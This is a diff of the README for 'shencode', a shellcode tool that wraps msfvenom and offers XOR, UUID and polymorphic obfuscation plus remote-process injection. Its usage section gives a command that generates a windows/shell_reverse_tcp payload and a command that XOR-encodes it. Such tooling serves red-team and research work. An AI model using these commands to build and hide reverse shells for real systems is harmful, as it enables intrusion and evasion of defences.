@@ -2,8 +2,6 @@
 
 A multi purpose tool for shellcode operations
 
-I am developing under Windows. This release brings some compatibility fixes for Kali Linux. `inject` and `ROR2ROL` are Windows dependent. All other features are now available for Kali and maybe other Posix OS.
-
 ![](shencode-042.png)
 
 ## Features
@@ -12,15 +10,16 @@ I am developing under Windows. This release brings some compatibility fixes for 
 
 - create
 	- create shellcodes with msfvenom
+	- create a [polymorphic payload](https://github.com/psycore8/shencode/wiki/create) 
 - encode
-	- `ROR13` to `ROL` with custom key (only Windows)
+	- `ROR13` to `ROL` with custom key (**Windows only**)
 	- `QR-Code`: hide OpCodes as QR-Code image
 	- `XOR` encryption
-	- `UUID` obfuscation
+	- `UUID` obfuscation - Please, check out my [Blog Post](https://www.nosociety.de/en:it-security:blog:obfuscation_shellcode_als_uuids_tarnen_-_teil_1) about this encoder
 - extract
 	- extract shellcode from position `x` to `y`
 - inject
-	- inject shellcode into a remote process (only Windows)
+	- inject shellcode into a remote process (**Windows only**)
 - output
 	- raw shellcode to file
 	- formatting options: `C++, C#, C-ASM, PS, PY, HEX`
@@ -30,15 +29,18 @@ I am developing under Windows. This release brings some compatibility fixes for 
 
 ## ToDo
 
+- make code more modular
 - automatical compile feature
-- integrate more frameworks
-- integrate more encoder
 
 ## How to use
 
 ### create shellcode
 
 `python shencode.py create --cmd="-p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4443 -f raw -o payload.bin"`
+
+#### Poly-XOR the generated shellcode
+
+`python shencode.py create --xor-stub --xor-filename payload.bin --xor-outputfile payload.xor --xor-key 35`
 
 ### encode shellcode
 
@@ -73,3 +75,4 @@ Please [refer to the wiki](https://github.com/psycore8/shencode/wiki) for a full
 - [Win32API with python3 injection](https://systemweakness.com/win32api-with-python3-part-iii-injection-6dd3c1b99c90)
 - [Violent python: XOR Encryption](https://samsclass.info/124/proj14/VPxor.htm)
 - [How to easily encrypt file in python](https://www.stackzero.net/how-to-easily-encrypt-file-in-python/)
+- [Shellcode XOR Encoder and Decoder](https://www.doyler.net/security-not-included/shellcode-xor-encoder-decoder)
